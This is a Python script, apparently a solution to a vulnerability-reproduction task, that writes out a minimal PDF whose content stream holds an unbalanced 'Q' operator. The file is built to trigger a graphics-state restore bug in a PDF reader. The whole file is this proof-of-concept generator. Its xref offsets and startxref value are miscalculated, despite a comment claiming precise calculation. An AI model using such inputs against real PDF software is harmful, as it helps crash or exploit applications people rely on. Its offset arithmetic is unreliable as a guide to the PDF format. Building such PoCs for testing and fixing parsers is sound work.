import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build minimal PDF with 'Q' operator without prior 'q' to trigger restore at depth 0
        parts = []

        # Header
        header = b"%PDF-1.4\n"
        parts.append(header)

        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        parts.append(obj1)

        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        parts.append(obj2)

        # Object 3: Page
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /ProcSet [/PDF /Text] >> >>\nendobj\n"
        parts.append(obj3)

        # Object 4: Contents stream with 'Q'
        stream_content = b"Q\n"
        stream_length = len(stream_content)
        obj4 = f"4 0 obj\n<< /Length {stream_length} >>\nstream\n".encode('ascii')
        parts.append(obj4)
        parts.append(stream_content)
        obj4_end = b"\nendstream\nendobj\n"
        parts.append(obj4_end)

        # Concatenate to calculate offsets
        pdf_content = b''.join(parts)

        # Xref table offsets (approximate, but calculate precisely)
        # Offset for obj1: len(header)
        offset1 = len(header)
        # offset2: offset1 + len(obj1)
        offset2 = offset1 + len(obj1)
        # offset3: offset2 + len(obj2)
        offset3 = offset2 + len(obj2)
        # offset4: offset3 + len(obj3)
        offset4_start = offset3 + len(obj3)
        offset4 = offset4_start + len(obj4)
        # After stream and end
        xref_start = offset4_start + len(stream_content) + len(obj4_end)

        # Xref
        xref = f"xref\n0 5\n0000000000 65535 f \n{offset1:010d} 00000 n \n{offset2:010d} 00000 n \n{offset3:010d} 00000 n \n{offset4:010d} 00000 n \n".encode('ascii')
        parts.append(xref)

        trailer = f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{xref_start + len(xref)}%%EOF\n".encode('ascii')
        parts.append(trailer)

        # Final PDF
        poc = b''.join(parts)
        return poc
